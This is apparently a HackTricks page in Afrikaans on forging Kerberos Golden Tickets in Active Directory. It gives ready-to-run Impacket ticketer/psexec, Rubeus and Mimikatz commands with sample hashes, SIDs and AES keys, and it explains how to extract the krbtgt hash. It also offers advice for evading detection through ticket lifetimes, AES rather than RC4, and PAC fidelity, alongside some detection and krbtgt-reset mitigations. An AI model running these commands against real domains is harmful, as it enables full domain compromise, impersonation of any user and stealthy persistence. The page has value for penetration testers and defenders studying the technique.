# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

'n **Golden Ticket**-aanval bestaan uit die **skepping van 'n geldige Ticket Granting Ticket (TGT) wat enige gebruiker naboots**, deur die **NTLM-hash van die Active Directory (AD) krbtgt-rekening** te gebruik. Hierdie tegniek is besonder voordelig omdat dit **toegang tot enige diens of masjien** binne die domein as die nagebootste gebruiker **moontlik maak**. Dit is noodsaaklik om te onthou dat die **krbtgt-rekening se geloofsbriewe nooit outomaties opgedateer word nie**.<sup>[[1]](#references)</sup>

Om die **NTLM-hash** van die krbtgt-rekening te **verkry**, kan verskeie metodes gebruik word. Dit kan uit die **Local Security Authority Subsystem Service (LSASS)-proses** of die **NT Directory Services (NTDS.dit)-lêer** op enige Domain Controller (DC) binne die domein onttrek word. Verder is die **uitvoer van 'n DCsync-aanval** nog 'n strategie om hierdie NTLM-hash te verkry, wat uitgevoer kan word met tools soos die **lsadump::dcsync-module** in Mimikatz of die **secretsdump.py-script** van Impacket. Dit is belangrik om te beklemtoon dat **domain admin-voorregte of 'n soortgelyke vlak van toegang gewoonlik vereis word** om hierdie bedrywighede uit te voer.<sup>[[2]](#references)</sup>

Alhoewel die NTLM-hash 'n geskikte metode vir hierdie doel is, word dit **sterk aanbeveel** om **tickets met die Advanced Encryption Standard (AES) Kerberos-sleutels (AES128 en AES256) te forge** om operasionele sekuriteitsredes. Dit is selfs belangriker in moderne domeine, omdat **die gebruik van RC4 uitgefaseer word** en baie duideliker in Kerberos-telemetrie uitstaan.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Moderne ticket crafting-notas

Waar moontlik, **query eers LDAP en SYSVOL** en forgeer dan die ticket met die werklike domeinbeleid en die gebruiker se PAC-waardes:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` vra die DC vir die gebruiker-, groep-, NetBIOS- en beleidsdata wat gebruik word om ’n meer realistiese PAC te bou.
- `/printcmd` druk ’n offline command line met die herwinde PAC-velde, wat nuttig is as jy later dieselfde ticket wil forge sonder om LDAP weer te gebruik.
- `/extendedupndns` voeg die nuwer `UpnDns` PAC-elemente by wat die `samAccountName` en account SID bevat.
- `/oldpac` verwyder die nuwer `Requestor`- en `Attributes`-PAC-buffers; dit is hoofsaaklik nuttig vir compatibility testing teenoor ouer omgewings, nie vir default tradecraft nie.

Van Linux af ondersteun onlangse Impacket-weergawes ook die byvoeging van die nuwer PAC-structures en die instelling van ’n realistiese geldigheidstydperk:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` is in **ure**. Die verstek is **10 jaar**, wat opvallend is.
- `-extra-pac` voeg die nuwer `UPN_DNS` PAC-inligting by.
- `-old-pac` dwing die legacy PAC-uitleg af.
- `-extra-sid` is nuttig wanneer die PAC bykomende SIDs benodig (byvoorbeeld in child-to-parent escalation-scenario's, wat in [SID-History Injection](sid-history-injection.md) behandel word).

**Sodra** jy die **golden Ticket injected** het, kan jy toegang tot die gedeelde lêers **(C$)** verkry en services en WMI uitvoer, sodat jy **psexec** of **wmiexec** kan gebruik om 'n shell te verkry (dit lyk asof jy nie 'n shell via winrm kan verkry nie).

### Om algemene opsporing te omseil

Die mees algemene maniere om 'n golden ticket op te spoor, is deur **Kerberos-verkeer** op die netwerk te inspekteer. Mimikatz **onderteken die TGT standaard vir 10 jaar**, wat as abnormaal sal uitstaan in daaropvolgende TGS-versoeke wat daarmee gemaak word.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Gebruik die `/startoffset`, `/endin` en `/renewmax`-parameters om die begin-offset, duur en maksimum hernuwings te beheer (alles in minute).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Ongelukkig genoeg word die TGT se leeftyd nie in 4769's aangeteken nie, dus sal jy hierdie inligting nie in die Windows-gebeurtenislogboeke vind nie. Wat jy egter kan korreleer, is **om 4769's sonder 'n voorafgaande 4768 te sien**. Dit is **nie moontlik om 'n TGS sonder 'n TGT aan te vra nie**, en indien daar geen rekord is van 'n TGT wat uitgereik is nie, kan ons aflei dat dit vanlyn vervals is.

In **nuwer Windows-bouweergawes** stel gebeurtenis-ID's **4768** en **4769** ook veel beter **enkripsietipe-telemetrie** bloot. 'n Vervalste TGT/TGS wat **RC4 (`0x17`)** gebruik in 'n domein waar `krbtgt`, kliënte en dienste reeds AES-sleutels het, is baie makliker om raak te sien as 'n paar jaar gelede. Dit is nog 'n rede om **AES-gesteunde Golden Tickets** te verkies en die domein se normale Kerberos-beleid so noukeurig moontlik na te volg.

Nog 'n OPSEC-kwessie is **PAC-fidelity**. Kaartjies met onmoontlike groep-lidmaatskappe, ontbrekende nuwer PAC-buffers, of rekeningmetadata wat nie met LDAP ooreenstem nie, is makliker om op te spoor wanneer verdedigers PAC-inhoud teen AD-data valideer. Indien jy 'n TGT nodig het wat lyk asof dit werklik deur 'n DC uitgereik is, hersien:

{{#ref}}
diamond-ticket.md
{{#endref}}

Daar is ook **omgewingsbeperkings** op volharding. Die `krbtgt`-rekening hou 'n **wagwoordgeskiedenis van 2**, dus kan 'n vervalste TGT geldig bly ná die **eerste** `krbtgt`-terugstelling indien dit met die vorige sleutel onderteken is. Dit is waarom verdedigers Golden Tickets ongeldig maak deur `krbtgt` **twee keer terug te stel** en minstens die domein se maksimum kaartjie-leeftyd tussen terugstellings te wag.<sup>[[3]](#references)</sup>

Om hierdie **opsporing te omseil**, gaan die diamond tickets na.

### Versagting

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Ander klein truuks wat verdedigers kan gebruik, is om **waarskuwings vir 4769's vir sensitiewe gebruikers** te stel, soos die verstekdomeinadministrateurrekening, en om te waarsku oor **RC4-gebruik vir `krbtgt`** in domeine wat normaalweg AES-kaartjies uitreik.<sup>[[5]](#references)</sup>

## Verwysings

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
